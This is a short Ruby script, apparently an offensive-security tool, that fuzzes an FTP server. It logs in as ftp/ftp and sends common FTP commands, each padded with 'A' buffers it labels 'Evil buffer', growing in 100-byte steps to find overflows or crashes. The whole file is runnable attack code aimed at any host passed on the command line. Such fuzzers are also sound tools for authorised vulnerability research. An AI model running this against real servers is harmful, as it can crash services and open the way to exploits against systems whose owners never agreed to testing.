# KING SABRI | @KINGSABRI
# Simple FTP COMMNDS Fuzzer
#
require 'socket'

class String
  def red; colorize(self, "\e[31m"); end
  def green; colorize(self, "\e[32m"); end
  def colorize(text, color_code);  "#{color_code}#{text}\e[0m" end
end

mark_Red   = "[+]".red
mark_Green = "[+]".green


host = ARGV[0] 
port = ARGV[1]

# List of FTP protocol commands
cmds = ["MKD","ACCL","TOP","CWD","STOR","STAT","LIST","RETR","NLST","LS","DELE","RSET","NOOP","UIDL","USER","APPE"]

buffer  = ["A"]
counter = 1

cmds.each do |cmd|
  buffer.each do |buf|

    while buffer.length <= 40
      buffer << "A" * counter
      counter += 100
    end

    s = TCPSocket.open(host, port)
    s.recv(1024)
    s.send("USER ftp\r\n", 0)
    s.recv(1024)
    s.send("PASS ftp\r\n", 0)
    s.recv(1024)
    puts mark_Red + " Sending " + "#{cmd} ".green + "Command with " + "#{buf.size} bytes ".green  + "Evil buffer" + ".".green
    s.send(cmd + " " + buf + "\r\n", 0)
    s.recv(1024)
    s.send("QUIT\r\n", 0)
    s.close
  end
  puts "~~~~~~~~~~~~~~~~~~~~".red
  sleep 0.5
end


